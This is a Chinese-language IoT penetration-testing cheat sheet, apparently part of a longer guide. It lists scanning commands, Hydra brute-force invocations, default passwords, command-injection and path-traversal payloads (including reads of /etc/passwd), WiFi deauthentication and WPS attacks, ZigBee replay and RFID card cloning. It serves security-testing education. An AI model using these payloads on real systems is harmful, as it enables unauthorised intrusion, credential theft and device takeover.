### 二、IoT 渗透测试常用命令

#### 1. 网络扫描与服务发现

```bash
# ===== Nmap 扫描 =====
# 快速扫描常用端口
nmap -sV -sC -O 192.168.1.0/24

# 扫描 IoT 常见端口
nmap -p 21,22,23,80,443,1883,5683,8080,8443,9090 -sV 192.168.1.0/24

# 脚本扫描（针对 IoT 设备）
nmap --script broadcast-upnp-info,http-enum,http-title,rtsp-request \
  192.168.1.0/24

# UPnP 设备发现
nmap --script upnp-info -sU -p 1900 192.168.1.0/24

# ===== 设备发现 =====
# ARP 扫描（快速发现局域网设备）
arp-scan -l
netdiscover -i eth0

# mDNS 设备发现（IoT 设备常用）
avahi-browse -a -r
dns-sd -B

# SSDP/UPnP 发现
# 使用 gupnp 工具
gssdp-discover -i eth0 --timeout=3

# ===== 端口服务识别 =====
# 识别 Telnet 服务
nc -nv 192.168.1.100 23

# 识别 SSH 服务版本
ssh -v 192.168.1.100 2>&1 | grep -i "remote protocol"

# 识别 HTTP 服务
curl -v http://192.168.1.100:80
curl -I http://192.168.1.100:8080

# 识别 MQTT 服务
# 使用 mosquitto_sub 探测
mosquitto_sub -h 192.168.1.100 -t '#' -v --quiet --connection-message 1 2>&1

# 识别 RTSP 服务
# 使用 ffmpeg 或 VLC 探测
ffprobe rtsp://192.168.1.100:554/stream 2>&1 | head -20
```

#### 2. Web/API 安全测试

```bash
# ===== 目录与文件扫描 =====
# Gobuster 目录爆破
gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt -t 50

# ffuf 模糊测试
ffuf -u http://192.168.1.100/FUZZ -w /usr/share/wordlists/dirb/common.txt

# 扫描备份文件
gobuster dir -u http://192.168.1.100 -w wordlist.txt \
  -x .bak,.old,.zip,.tar.gz,.conf,.cfg,.ini

# ===== 默认凭证测试 =====
# HTTP 基本认证爆破
hydra -l admin -P passwords.txt 192.168.1.100 http-get /admin

# 表单登录爆破
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:F=incorrect"

# Telnet 凭证爆破
hydra -L users.txt -P passwords.txt telnet://192.168.1.100

# SSH 凭证爆破
hydra -L users.txt -P passwords.txt ssh://192.168.1.100

# ===== 常用 IoT 默认凭证 =====
# 常见组合：
# admin/admin, admin/123456, admin/password, root/root
# root/admin, user/user, guest/guest, support/support
# admin/(空密码), root/(空密码)

# 使用 RouterSploit 扫描默认凭证
# 安装 RouterSploit
git clone https://github.com/threat9/routersploit
cd routersploit
python3 -m pip install -r requirements.txt
python3 rsf.py

# 使用 scanners/autopwn 自动扫描
# use scanners/autopwn
# set target 192.168.1.100
# run
```

#### 3. 固件漏洞验证

```bash
# ===== 命令注入测试 =====
# 测试 Web 接口命令注入
curl "http://192.168.1.100/cgi-bin/ping.cgi?ip=127.0.0.1;id"

# 测试各种绕过方式
curl "http://192.168.1.100/cgi-bin/test.cgi?cmd=ls"
curl "http://192.168.1.100/cgi-bin/test.cgi?cmd=ls%20-la"
curl "http://192.168.1.100/cgi-bin/test.cgi?cmd=$(ls)"
curl "http://192.168.1.100/cgi-bin/test.cgi?cmd=`id`"

# ===== 缓冲区溢出测试 =====
# 发送长字符串测试溢出
python3 -c "print('A' * 1000)" | nc 192.168.1.100 80

# 测试 HTTP 缓冲区溢出
curl -H "User-Agent: $(python3 -c 'print("A"*2000)')" http://192.168.1.100/

# ===== 认证绕过测试 =====
# 测试路径遍历
curl http://192.168.1.100/../../../etc/passwd
curl http://192.168.1.100/..%2f..%2f..%2fetc%2fpasswd

# 测试 HTTP 头绕过
curl -H "X-Forwarded-For: 127.0.0.1" http://192.168.1.100/admin
curl -H "Referer: http://192.168.1.100/login" http://192.168.1.100/admin

# ===== 固件提取验证 =====
# 通过 UART/串口获取固件
# 使用 screen 连接串口
screen /dev/ttyUSB0 115200

# 中断启动过程（U-Boot）
# 按任意键中断，进入 U-Boot 命令行
# U-Boot> printenv
# U-Boot> tftp 0x81000000 firmware.bin
# U-Boot> bootm 0x81000000

# 从 Flash 读取固件
# 使用 flashrom
flashrom -p ch341a_spi -r firmware_dump.bin

# 验证提取的固件
binwalk firmware_dump.bin
file firmware_dump.bin
md5sum firmware_dump.bin
```

#### 4. 无线 IoT 测试

```bash
# ===== WiFi 测试 =====
# 监控模式
iwconfig wlan0 mode monitor
airmon-ng start wlan0

# 扫描 WiFi 网络
airodump-ng wlan0mon
wash -i wlan0mon  # WPS 扫描

# WPA/WPA2 握手捕获
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
aireplay-ng -0 1 -a AA:BB:CC:DD:EE:FF -c FF:EE:DD:CC:BB:AA wlan0mon

# WPS 攻击
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# ===== BLE 测试 =====
# 扫描 BLE 设备
hcitool lescan
bleah -l
nrfutil devices list

# 使用 Ubertooth 抓 BLE 包
ubertooth-btle -f -c capture.pcap

# BLE 连接测试
gatttool -b AA:BB:CC:DD:EE:FF -I
# > connect
# > characteristics
# > char-read-hnd 0x000a

# ===== ZigBee 测试 =====
# 安装 KillerBee
pip install killerbee

# 扫描 ZigBee 网络
zbstumbler
zbfind --chanlist all

# 抓包
zbwireshark -c 15 -w zigbee_capture.pcap

# 重放攻击
zbreplay -r capture.pcap -c 15

# ===== RFID/NFC 测试 =====
# Proxmark3 常用命令
# 读取卡片
hf search
lf search

# 读取 UID
hf 14a info
lf em 410x read

# 克隆卡
hf mf clone 1  # 克隆 Mifare Classic 1k
```

### 三、IoT 渗透测试流程与检查清单

```
IoT 渗透测试流程
┌─────────────────────────────────────────────────────┐
│  1. 信息收集 (Reconnaissance)                       │
│     - 设备识别（型号、厂商、固件版本）                │
│     - 网络扫描（端口、服务、协议）                    │
│     - 无线信号扫描（WiFi/BLE/ZigBee）                │
│     - 开源情报（固件下载、漏洞数据库）                │
└──────────────────────┬──────────────────────────────┘
                       ▼
┌─────────────────────────────────────────────────────┐
│  2. 固件分析 (Firmware Analysis)                    │
│     - 固件获取（下载/拆机/串口）                     │
│     - 固件解包（binwalk/FMK）                       │
│     - 静态分析（逆向/字符串搜索/配置分析）            │
│     - 动态分析（QEMU/Firmadyne 模拟运行）             │
└──────────────────────┬──────────────────────────────┘
                       ▼
┌─────────────────────────────────────────────────────┐
│  3. 硬件测试 (Hardware Testing)                     │
│     - 电路板分析（芯片识别、调试接口）                │
│     - UART 串口通信（获取 shell、启动日志）           │
│     - JTAG/SWD 调试（读取固件、内存读写）             │
│     - Flash 读取（SPI/NOR/NAND Flash）               │
└──────────────────────┬──────────────────────────────┘
                       ▼
┌─────────────────────────────────────────────────────┐
│  4. 网络协议测试 (Network Protocol Testing)         │
│     - Web/API 安全（注入、XSS、认证绕过）             │
│     - MQTT/CoAP 协议安全                            │
│     - 私有协议逆向分析                               │
│     - 中间人攻击测试                                 │
└──────────────────────┬──────────────────────────────┘
                       ▼
┌─────────────────────────────────────────────────────┐
│  5. 漏洞利用 (Exploitation)                         │
│     - 命令注入漏洞利用                               │
│     - 缓冲区溢出利用                                 │
│     - 认证绕过利用                                   │
│     - 默认凭证利用                                   │
└──────────────────────┬──────────────────────────────┘
                       ▼
┌─────────────────────────────────────────────────────┐
│  6. 后渗透与横向移动 (Post-Exploitation)            │
│     - 获取 Shell 权限                               │
│     - 提权（从用户到 root）                          │
│     - 内网横向移动                                   │
│     - 数据窃取与持久化                               │
└─────────────────────────────────────────────────────┘
```
